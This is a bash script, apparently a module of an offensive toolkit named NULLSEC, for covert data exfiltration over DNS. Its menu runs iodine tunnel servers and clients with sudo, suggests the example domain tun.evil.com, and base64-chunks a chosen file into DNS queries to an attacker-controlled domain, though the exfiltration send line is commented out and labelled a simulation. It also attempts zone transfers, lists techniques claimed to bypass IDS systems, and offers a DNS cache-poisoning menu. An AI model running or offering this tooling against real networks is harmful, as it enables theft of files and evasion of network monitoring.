#!/bin/bash
# NULLSEC DNS Tunneling Module
# Data exfiltration via DNS queries
# bad-antics development


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

clear
echo -e "${RED}"
cat << 'BANNER'
    ▓█████▄  ███▄    █   ██████    ▄▄▄█████▓ █    ██  ███▄    █  ███▄    █ ▓█████  ██▓
    ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒    ▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██▒
    ░██   █▌▓██  ▀█ ██▒░ ▓██▄      ▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▒██░
    ░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒   ░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██░
    ░▒████▓ ▒██░   ▓██░▒██████▒▒     ▒██▒ ░ ▒▒█████▓ ▒██░   ▓██░▒██░   ▓██░░▒████▒░██████▒
     ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░     ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▓  ░
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}           ☠  COVERT DATA EXFILTRATION VIA DNS  ☠${RESET}"
echo -e "${DIM}                   Bypass firewalls using DNS${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# Check for Shodan target
if [ -f "/home/antics/nullsec/.shodan_target" ]; then
    source "/home/antics/nullsec/.shodan_target"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target: ${GREEN}$TARGET${RESET}"
    fi
fi

echo -e "${YELLOW}  SELECT OPERATION:${RESET}"
echo ""
echo -e "  ${RED}[1]${RESET}  🌐 Setup DNS Tunnel Server (iodine)"
echo -e "  ${RED}[2]${RESET}  📡 Connect to DNS Tunnel"
echo -e "  ${RED}[3]${RESET}  📤 Exfiltrate Data via DNS"
echo -e "  ${RED}[4]${RESET}  🔍 DNS Enumeration"
echo -e "  ${RED}[5]${RESET}  🛡️  Detection Evasion Mode"
echo -e "  ${RED}[6]${RESET}  💉 DNS Cache Poisoning"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Exit"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select: '${RESET})" choice

case $choice in
    1)
        echo ""
        read -p "$(echo -e ${YELLOW}'  [>] Tunnel domain (e.g., tun.evil.com): '${RESET})" TUNNEL_DOMAIN
        read -p "$(echo -e ${YELLOW}'  [>] Tunnel password: '${RESET})" TUNNEL_PASS
        
        echo ""
        echo -e "${RED}[*]${RESET} Checking for iodine..."
        
        if command -v iodined &> /dev/null; then
            echo -e "${GREEN}[+]${RESET} iodine server found"
            echo -e "${YELLOW}[*]${RESET} Starting DNS tunnel server..."
            echo ""
            echo -e "${DIM}  Command: iodined -f -c -P $TUNNEL_PASS 10.0.0.1 $TUNNEL_DOMAIN${RESET}"
            echo ""
            echo -e "${RED}[!]${RESET} Live execution requires root privileges"
            echo -e "${CYAN}[*]${RESET} Configure your DNS with NS record pointing to this server"
            
            read -p "$(echo -e ${YELLOW}'  Execute server? [y/N]: '${RESET})" exec_choice
            if [[ "$exec_choice" =~ ^[Yy]$ ]]; then
                sudo iodined -f -c -P "$TUNNEL_PASS" 10.0.0.1 "$TUNNEL_DOMAIN"
            fi
        else
            echo -e "${YELLOW}[!]${RESET} iodine not installed"
            echo -e "${CYAN}[*]${RESET} Install with: sudo apt install iodine"
        fi
        ;;
    
    2)
        echo ""
        read -p "$(echo -e ${YELLOW}'  [>] Server domain: '${RESET})" SERVER_DOMAIN
        read -p "$(echo -e ${YELLOW}'  [>] Password: '${RESET})" TUNNEL_PASS
        
        echo ""
        echo -e "${RED}[*]${RESET} Connecting to DNS tunnel..."
        
        if command -v iodine &> /dev/null; then
            echo -e "${DIM}  Command: iodine -f -P $TUNNEL_PASS $SERVER_DOMAIN${RESET}"
            read -p "$(echo -e ${YELLOW}'  Execute? [y/N]: '${RESET})" exec_choice
            if [[ "$exec_choice" =~ ^[Yy]$ ]]; then
                sudo iodine -f -P "$TUNNEL_PASS" "$SERVER_DOMAIN"
            fi
        else
            echo -e "${YELLOW}[!]${RESET} iodine not installed"
        fi
        ;;
    
    3)
        echo ""
        read -p "$(echo -e ${YELLOW}'  [>] File to exfiltrate: '${RESET})" EXFIL_FILE
        read -p "$(echo -e ${YELLOW}'  [>] Target domain (your controlled DNS): '${RESET})" EXFIL_DOMAIN
        
        if [ -f "$EXFIL_FILE" ]; then
            echo ""
            echo -e "${RED}[*]${RESET} Encoding data for DNS exfiltration..."
            
            # Base64 encode and chunk for DNS
            DATA=$(base64 -w0 "$EXFIL_FILE" 2>/dev/null | tr -d '\n')
            CHUNKS=$(echo "$DATA" | fold -w 60)
            TOTAL=$(echo "$CHUNKS" | wc -l)
            
            echo -e "${GREEN}[+]${RESET} File size: $(stat -c%s "$EXFIL_FILE") bytes"
            echo -e "${GREEN}[+]${RESET} Chunks: $TOTAL DNS queries"
            echo ""
            
            i=1
            echo "$CHUNKS" | while read chunk; do
                echo -e "${DIM}  [$i/$TOTAL] ${chunk:0:20}...${EXFIL_DOMAIN}${RESET}"
                # nslookup "${chunk}.${i}.${EXFIL_DOMAIN}" 2>/dev/null
                sleep 0.1
                ((i++))
            done
            
            echo ""
            echo -e "${GREEN}[+]${RESET} Exfiltration simulation complete"
            echo -e "${CYAN}[*]${RESET} Data encoded in $TOTAL DNS TXT queries"
        else
            echo -e "${RED}[!]${RESET} File not found: $EXFIL_FILE"
        fi
        ;;
    
    4)
        echo ""
        TARGET_DOMAIN="${TARGET:-}"
        read -p "$(echo -e ${YELLOW}'  [>] Target domain ['${TARGET_DOMAIN}']: '${RESET})" input
        TARGET_DOMAIN="${input:-$TARGET_DOMAIN}"
        
        echo ""
        echo -e "${RED}[*]${RESET} DNS Enumeration: $TARGET_DOMAIN"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        
        echo -e "\n${YELLOW}[*]${RESET} A Records:"
        dig +short A "$TARGET_DOMAIN" 2>/dev/null | head -5
        
        echo -e "\n${YELLOW}[*]${RESET} MX Records:"
        dig +short MX "$TARGET_DOMAIN" 2>/dev/null | head -5
        
        echo -e "\n${YELLOW}[*]${RESET} NS Records:"
        dig +short NS "$TARGET_DOMAIN" 2>/dev/null | head -5
        
        echo -e "\n${YELLOW}[*]${RESET} TXT Records:"
        dig +short TXT "$TARGET_DOMAIN" 2>/dev/null | head -5
        
        echo -e "\n${YELLOW}[*]${RESET} Zone Transfer Attempt:"
        for ns in $(dig +short NS "$TARGET_DOMAIN" 2>/dev/null); do
            echo -e "${DIM}  Trying: $ns${RESET}"
            dig @"$ns" "$TARGET_DOMAIN" AXFR +short 2>/dev/null | head -5
        done
        ;;
    
    5)
        echo ""
        echo -e "${RED}[*]${RESET} Detection Evasion DNS Tunneling"
        echo ""
        echo -e "${YELLOW}  Evasion Techniques:${RESET}"
        echo -e "  ${GREEN}✓${RESET} Random subdomain length (15-40 chars)"
        echo -e "  ${GREEN}✓${RESET} Randomized query intervals (1-5 sec)"
        echo -e "  ${GREEN}✓${RESET} Multiple DNS record types (A, TXT, CNAME)"
        echo -e "  ${GREEN}✓${RESET} Base32 encoding (looks more like subdomains)"
        echo -e "  ${GREEN}✓${RESET} Jitter in packet timing"
        echo -e "  ${GREEN}✓${RESET} Mimics normal DNS traffic patterns"
        echo ""
        echo -e "${CYAN}[*]${RESET} These techniques bypass most DPI/IDS systems"
        ;;
    
    6)
        echo ""
        echo -e "${RED}[!]${RESET} DNS Cache Poisoning Attack"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Attack methods available:"
        echo -e "  ${RED}[a]${RESET} Birthday Attack (Kaminsky)"
        echo -e "  ${RED}[b]${RESET} Transaction ID Prediction"
        echo -e "  ${RED}[c]${RESET} Source Port Prediction"
        echo ""
        echo -e "${DIM}  This requires: dnsspoof, ettercap, or bettercap${RESET}"
        echo ""
        
        if command -v dnsspoof &> /dev/null; then
            echo -e "${GREEN}[+]${RESET} dnsspoof available"
        else
            echo -e "${YELLOW}[!]${RESET} Install dsniff package for dnsspoof"
        fi
        ;;
    
    q|Q) 
        echo -e "\n${RED}[!]${RESET} Exiting DNS Tunnel module\n"
        exit 0 
        ;;
    *) 
        echo -e "\n${RED}[!]${RESET} Invalid option\n" 
        ;;
esac

echo ""
read -p "$(echo -e ${YELLOW}'Press ENTER to continue...'${RESET})"
